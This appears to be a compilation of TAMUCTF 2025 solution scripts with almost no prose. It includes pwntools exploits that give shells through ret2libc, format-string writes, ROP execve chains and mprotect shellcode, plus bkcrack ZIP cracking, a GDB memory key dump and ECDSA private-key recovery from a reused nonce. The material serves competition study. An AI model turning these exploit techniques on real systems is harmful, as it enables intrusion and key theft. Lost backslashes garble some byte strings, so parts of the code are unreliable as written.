# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/TAMUCTF_·_2025_WriteUp.md
# TITLE: TAMUCTF · 2025 WriteUp
# CATEGORY: pwn

from pwn import *

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.send(b"A"*0x50 + p64(0x404100) + p64(0x4013A0))
io.recvuntil(b":) )n")
io.sendline(b"1")
io.recvuntil(b"leak: ")
system = int(io.recv(12), 16)
libc = ELF("./libc.so.6")
libc_base = system - libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
rdi_ret = libc_base + next(libc.search(b"x5FxC3"))
io.send(b"A" * 0x68 + p64(rdi_ret) + p64(sh_addr) + p64(system))
io.interactive()
from pwn import *
import re

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")

io.recvuntil(b"0x")
stack = int(io.recv(12), 16)
flag_addr = stack + 0x70 + 2
io.sendline(f"%{0xAA}c%11$hhn%{0xA0A-0xAA}c%10$hn%20$saaa".encode()+p64(flag_addr)+p64(stack-8))
print(re.findall(b"gigem{.*}",io.recvuntil(b"}"))[0])

# io.interactive()
from pwn import *
import re

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_rop-thirteen")

rax_ret = 0x000000000040cc26
rbp_ret = 0x000000000045f34d
rdi_xxx_ret = 0x000000000047ea5c
# pop rdi; or byte ptr [rax - 1], cl; ret;
rdx_ret = 0x00000000004801bd
rsi_ret = 0x000000000041cf18
rsp_ret = 0x0000000000438d50
syscall_ret = 0x000000000045f409
leave_ret = 0x00000000004825da
io.recvuntil(b"): n")
io.sendline(b"A"*0x20)
io.recvuntil(b"here: n")
bss = 0x54B800
pl = b"B"*0xf0+p64(0x10a)+p64(0x168)+p64(0xc0000a4ef0)+p64(bss)
pl += p64(rax_ret) + p64(bss + 0x100) 
pl += p64(rdi_xxx_ret) + p64(0)
pl += p64(rsi_ret) + p64(bss)
pl += p64(rax_ret) + p64(0)
pl += p64(syscall_ret) + p64(leave_ret)
io.send(pl)
sleep(0.5)
pl2 = b"A" * 8
pl2 += p64(rax_ret) + p64(bss + 0x100) 
pl2 += p64(rdi_xxx_ret) + p64(0)
pl2 += p64(rdx_ret) + p64(0x100)
pl2 += p64(rsi_ret) + p64(bss+0x200)
pl2 += p64(rax_ret) + p64(0)
pl2 += p64(syscall_ret)
pl2 += p64(rax_ret) + p64(bss + 0x100)
pl2 += p64(rdi_xxx_ret) + p64(bss+0x200)
pl2 += p64(rdx_ret) + p64(0)
pl2 += p64(rsi_ret) + p64(0)
pl2 += p64(rax_ret) + p64(0x3b)
pl2 += p64(syscall_ret)
io.send(pl2)
sleep(0.5)
io.send(b"/bin/shx00")

io.interactive()
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")

elf = ELF("./pwn")
gadget1 = 0x401348
gadget2 = 0x401362
def ret2csu(got_addr, rdi, rsi, rdx):
    padding = 0
    payload = padding * b'A' + p64(gadget2)
    payload += p64(0) + p64(1) 
    payload += p64(got_addr) + p64(rdi) + p64(rsi) + p64(rdx)
    payload += p64(gadget1) + b'a'*0x38
    return payload

io.send(b"x54x5Ex31xFFx0Fx05xC3")
'''
push rsp
pop rsi
xor edi, edi
syscall
ret
'''
sleep(0.5)
pl = ret2csu(elf.got['mprotect'], 0x500000, 0x1000, 7)
pl += ret2csu(elf.got['read'], 0, 0x500000, 0x1000)
pl += p64(0x401121)
io.send(pl)
sleep(0.5)
orw = asm(shellcraft.amd64.open("flag.txt"))
orw += asm(shellcraft.amd64.read('rax', 'rsp', 0x100))
orw += asm(shellcraft.amd64.write(1, 'rsp', 0x100))
io.send(orw)

io.interactive()
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-2")
io = process("./pwn")
elf = ELF("./pwn")

def transform(data):
    data_l = list(data)
    for i in range(len(data_l)):
        if data_l[i] > 0x40and data_l[i] <=0x5a:
            data_l[i] += 0x20
        elif data_l[i] > 0x60and data_l[i] <= 0x7a:
            data_l[i] -= 0x20

    return bytes(data_l)

io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.recvuntil(b"):nn")
pl = transform(b"A"*0x58 + b"xB3x53")
io.send(pl)
io.recvuntil(b"A"*0x58)
pie = u64(io.recv(6) + b"x00x00") - 0x13B3
print(hex(pie))
bss = pie + 0x4020 + 0x800
io.recvuntil(b"Exitnn")
io.sendline(b"1")
io.recvuntil(b"):nn")
pl = b"A"*0x50 + p64(bss) + p64(pie+0x134A)
io.send(transform(pl))
leave_ret = pie + 0x00000000000012da
rdi_ret = pie + 0x000000000000145b
rsi_r15_ret = pie + 0x0000000000001459
pl = p64(rdi_ret) + p64(pie + elf.got['puts']) + p64(pie + elf.plt['puts'])
pl += p64(rdi_ret) + p64(0)
pl += p64(rsi_r15_ret) + p64(bss-8) + p64(0) + p64(pie + elf.plt['read'])
pl = pl.ljust(0x50, b"A")
pl += p64(bss - 0x58) + p64(leave_ret)
io.send(transform(pl))
io.recvuntil(b"s):nn")
io.recvline()
io.recvline()
puts = u64(io.recv(6) + b"x00x00")
libc = ELF("./libc.so.6")
libc_base = puts - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
pl = p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
io.sendline(pl)

io.interactive()
bkcrack -C deflated.zip -c .git/HEAD -p HEAD.txt
bkcrack -C deflated.zip -k f2635bca a91bec3a ec81bdf9 -D decrypted.zip
git show 01c525a:
print_flag.py > print_flag.py
import hashlib
from z3 import *

class Brain:
    def __init__(self, neurons):
        self.thought_size = 10
        self.neurons = [row.copy() for row in neurons]  # 使用列表推导式深拷贝

    def brainstem(self):
        flat = sum(self.neurons, [])
        joined = ",".join(map(str, flat))
        return hashlib.sha256(joined.encode()).hexdigest()

    def rot(self, data):
        for i in range(len(data)):
            row = (3 * i + 7) % self.thought_size
            col = (9 * i + 3) % self.thought_size
            self.neurons[row][col] ^= data[i]

    def think(self, data):
        thought = [0] * self.thought_size
        for i in range(self.thought_size):
            thought[i] = sum(self.neurons[i][j] * data[j] for j in range(self.thought_size))
        self.neurons = self.neurons[1:] + [thought.copy()]
        return thought

# ---------------------- 原始数据填充 ----------------------
healthy_brain = [
    [71, 101, 18, 37, 41, 69, 80, 28, 23, 48],
    [35, 32, 44, 24, 27, 20, 34, 58, 24, 9],
    [73, 29, 37, 94, 27, 58, 104, 65, 116, 44],
    [26, 83, 77, 116, 9, 96, 111, 118, 52, 62],
    [100, 15, 119, 53, 59, 34, 38, 68, 104, 110],
    [51, 1, 54, 62, 56, 120, 4, 80, 60, 120],
    [125, 92, 95, 98, 97, 110, 93, 33, 128, 93],
    [70, 23, 123, 40, 75, 23, 104, 73, 52, 6],
    [14, 11, 99, 16, 124, 52, 14, 73, 47, 66],
    [128, 11, 49, 111, 64, 108, 14, 66, 128, 101]
]

brainrot = b"gnilretskdi ,coffee ,ymotobol ,amenic etulosba ,oihO ni ylno ,oihO ,pac eht pots ,pac ,yadot yarp uoy did ,pu lio ,eohs ym elkcub 2 1 ,sucric latigid ,zzir tanec iaK ,tac frumS ,yzzilg ,ekahs melraH ,tanec iaK ,raebzaf ydderF ,gnixamnoog ,hoesac ,relzzir eht rof ttayg ruoy tuo gnikcits ,reppay ,gnippay ,pay ,gniggom ,gom,ttalcobmob ,gnillihc gnib ,deepswohsi ,tor niarb ,oitar + L ,ozob L ,L ,oitar ,ie ie iE ,suoived ,emem seimmug revas efil dna seceip s'eseeR ,io io io ,ytrap zzir koTkiT ,teggun ,su gnoma ,retsopmi ,yssus ,suS ,elgnid eladnuaQ ,gnos metsys ym ni atnaF ,kcil suoived ,syddid ta sthgin 5 ,hsinapS ro hsilgnE .gnos teksirb ,agnizab ,bruc eht etib ,orb lil ,dulb ,ni gnihcram og stnias eht nehw ho ,neerb fo seert ees I ,sinneD ekud ,biks no ,ennud yvvil ,knorg ybab ,rehtorb pu s'tahw ,gab eht ni seirf eht tuP ,edaf repat wol ,yddid ,yddirg ,ahpla ,gnixxamskool ,gninoog ,noog ,egde ,gnigde ,raeb evif ydderf ,ekahs ecamirg ,ynnacnu ,arua ,daeh daerd tnalahcnon ,ekard ,gnixat munaF ,xat munaf ,zzir idibikS ,yug llihc ,eiddab ,kooc reh/mih tel ,gnikooc ,kooc ,nissub ,oihO ,amgis eht tahw ,amgis ,idibikS no ,relzzir ,gnizzir ,zzir ,wem ,gniwem ,ttayg ,teliot idibikS ,idibikS"[
           ::-1]

required_thoughts = [
    [59477, 41138, 59835, 73146, 77483, 59302, 102788, 67692, 62102, 85259],
    [40039, 59831, 72802, 77436, 57296, 101868, 69319, 59980, 84518, 73579466],
    [59783, 73251, 76964, 58066, 101937, 68220, 59723, 85312, 73537261, 7793081533],
    [71678, 77955, 59011, 102453, 66381, 60215, 86367, 74176247, 9263142620, 982652150581],
]

# ---------------------- 主逻辑 ----------------------
brain = Brain(healthy_brain)
brain.rot(brainrot)  # 处理 brainrot 数据

flag = bytearray()
for block_idx in range(4):
    matrix = brain.neurons  # 当前神经元矩阵
    target = required_thoughts[block_idx]

    # 使用Z3求解器约束整数范围
    s = Solver()
    x = [Int(f'x_{i}') for i in range(10)]
    for var in x:
        s.add(var >= 0, var <= 255)  # 确保输入是合法字节

    # 添加线性方程组约束
    for i in range(10):
        s.add(sum(matrix[i][j] * x[j] for j in range(10)) == target[i])

    if s.check() != sat:
        print(f"块 {block_idx} 无解")
        exit()

    model = s.model()
    solution = [model[var].as_long() for var in x]
    flag.extend(solution)
    brain.think(solution)  # 更新神经元矩阵

# 验证哈希并输出
if brain.brainstem() == "4fe4bdc54342d22189d129d291d4fa23da12f22a45bca01e75a1f0e57588bf16":
    print("Flag:", flag.decode())
else:
    print("哈希验证失败")
from hashlib import sha256

class Brain:
    def __init__(unc, neurons):
        unc.neurons = neurons
        unc.thought_size = 10

    def brainstem(unc):
        return sha256(",".join(str(x) for x in sum(unc.neurons, [])).encode()).hexdigest()

    def rot(unc, data):
        for i in range(len(data)):
            unc.neurons[(3 * i + 7) % unc.thought_size][(9 * i + 3) % unc.thought_size] ^= data[i]

    def think(unc, data):
        thought = [0] * unc.thought_size
        for i in range(unc.thought_size):
            thought[i] = sum(unc.neurons[i][j] * data[j] for j in range(unc.thought_size))
        unc.neurons[:-1] = unc.neurons[1:]
        unc.neurons[-1] = thought
        return thought
    
healthy_brain = [[71, 101, 18, 37, 41, 69, 80, 28, 23, 48], [35, 32, 44, 24, 27, 20, 34, 58, 24, 9], [73, 29, 37, 94, 27, 58, 104, 65, 116, 44], [26, 83, 77, 116, 9, 96, 111, 118, 52, 62], [100, 15, 119, 53, 59, 34, 38, 68, 104, 110], [51, 1, 54, 62, 56, 120, 4, 80, 60, 120], [125, 92, 95, 98, 97, 110, 93, 33, 128, 93], [70, 23, 123, 40, 75, 23, 104, 73, 52, 6], [14, 11, 99, 16, 124, 52, 14, 73, 47, 66], [128, 11, 49, 111, 64, 108, 14, 66, 128, 101]]
brainrot = b"gnilretskdi ,coffee ,ymotobol ,amenic etulosba ,oihO ni ylno ,oihO ,pac eht pots ,pac ,yadot yarp uoy did ,pu lio ,eohs ym elkcub 2 1 ,sucric latigid ,zzir tanec iaK ,tac frumS ,yzzilg ,ekahs melraH ,tanec iaK ,raebzaf ydderF ,gnixamnoog ,hoesac ,relzzir eht rof ttayg ruoy tuo gnikcits ,reppay ,gnippay ,pay ,gniggom ,gom,ttalcobmob ,gnillihc gnib ,deepswohsi ,tor niarb ,oitar + L ,ozob L ,L ,oitar ,ie ie iE ,suoived ,emem seimmug revas efil dna seceip s'eseeR ,io io io ,ytrap zzir koTkiT ,teggun ,su gnoma ,retsopmi ,yssus ,suS ,elgnid eladnuaQ ,gnos metsys ym ni atnaF ,kcil suoived ,syddid ta sthgin 5 ,hsinapS ro hsilgnE .gnos teksirb ,agnizab ,bruc eht etib ,orb lil ,dulb ,ni gnihcram og stnias eht nehw ho ,neerb fo seert ees I ,sinneD ekud ,biks no ,ennud yvvil ,knorg ybab ,rehtorb pu s'tahw ,gab eht ni seirf eht tuP ,edaf repat wol ,yddid ,yddirg ,ahpla ,gnixxamskool ,gninoog ,noog ,egde ,gnigde ,raeb evif ydderf ,ekahs ecamirg ,ynnacnu ,arua ,daeh daerd tnalahcnon ,ekard ,gnixat munaF ,xat munaf ,zzir idibikS ,yug llihc ,eiddab ,kooc reh/mih tel ,gnikooc ,kooc ,nissub ,oihO ,amgis eht tahw ,amgis ,idibikS no ,relzzir ,gnizzir ,zzir ,wem ,gniwem ,ttayg ,teliot idibikS ,idibikS"[::-1]

brain = Brain(healthy_brain)
brain.rot(brainrot)

# flag = input("> ").encode()
# if not len(flag) == 40:
#     print("i'll be nice and tell you my thoughts have to be exactly 40 characters long")
#     exit()
required_thoughts = [
    [59477, 41138, 59835, 73146, 77483, 59302, 102788, 67692, 62102, 85259],
    [40039, 59831, 72802, 77436, 57296, 101868, 69319, 59980, 84518, 73579466],
    [59783, 73251, 76964, 58066, 101937, 68220, 59723, 85312, 73537261, 7793081533],
    [71678, 77955, 59011, 102453, 66381, 60215, 86367, 74176247, 9263142620, 982652150581],
]

# failed_to_think = False
# for i in range(0, len(flag), 10):
#     thought = brain.think(flag[i:i + 10])
#     if thought != required_thoughts[i//10]:
#         failed_to_think = True

# if failed_to_think or brain.brainstem() != "4fe4bdc54342d22189d129d291d4fa23da12f22a45bca01e75a1f0e57588bf16":
#     print("ermm... you might not be a s""igma...")
# else:
#     print("holy s""kibidi you popped off... go submit the flag")

import numpy as np

for i in range(4):
    A=np.linalg.inv(brain.neurons)
    C=A @ required_thoughts[i]
    for j in C:
        print(chr(round(j)),end='')
    brain.neurons[:-1]= brain.neurons[1:]
    brain.neurons[-1]=required_thoughts[i]
    
print(brain.brainstem())
bt # 查看调用栈
frame 5 # 切换到5栈帧
print key # 输出key
x/59xb key # 查看key区域的59个字节
info locals # 查看局部变量
# test.gdb文件
set pagination off
set confirm off

# 输出文件（二进制格式）
set$outfile = "all_keys.bin"
shell rm -f $outfile
# 清空旧文件

define extract_keys
    set$frame = 4
    while$frame <= 1003
        frame $frame
        if$pc == 0
            echo"Frame $frame is invalid.n"
        else
            # 检查key是否存在
            if &key == 0
                echo"Frame $frame: 'key' not found.n"
            else
                # 追加59字节到文件
                append binary memory outfile key (key + 59)
                echo"Appended Frame $framen"
            end
        end
        set$frame = $frame + 1
    end
end

extract_keys
echo"All keys saved to " + $outfile + "n"
quit
with open('outfile','rb') as f1,open('encrypted_flag.bin','rb') as f2:
    s1=f1.read()
    s2=f2.read()
    
s2=bytearray(s2)
for i in range(1000):
    for j in range(59):
        s2[j]^=s1[i*59+j]
        
print(bytes(s2))
from hashlib import sha256
from Crypto.Util.number import*

n = 115792089210356248762697446949407573529996955224135760342422259061068512044369

message1 = "The secp256r1 curve was used."
message2 = "k value may have been re-used."

r = 91684750294663587590699225454580710947373104789074350179443937301009206290695
s1 = 8734396013686485452502025686012376394264288962663555711176194873788392352477
s2 = 96254287552668750588265978919231985627964457792323178870952715849103024292631

H_m1 = bytes_to_long(sha256(message1.encode()).digest())
H_m2 = bytes_to_long(sha256(message2.encode()).digest())
print(f"H(m1) = {H_m1}")
print(f"H(m2) = {H_m2}")

diff_h = (H_m1 - H_m2) % n
diff_s = (s1 - s2) % n
inv_diff_s = inverse(diff_s, n)
k = (diff_h * inv_diff_s) % n
print(f"k = {k}")
r_inv = inverse(r, n)
d = ((s1 * k - H_m1) % n) * r_inv % n
print(f"Private key d = {d}")

k_inv = inverse(k, n)
computed_s1 = (k_inv * (H_m1 + d * r)) % n
computed_s2 = (k_inv * (H_m2 + d * r)) % n

print(long_to_bytes(d))
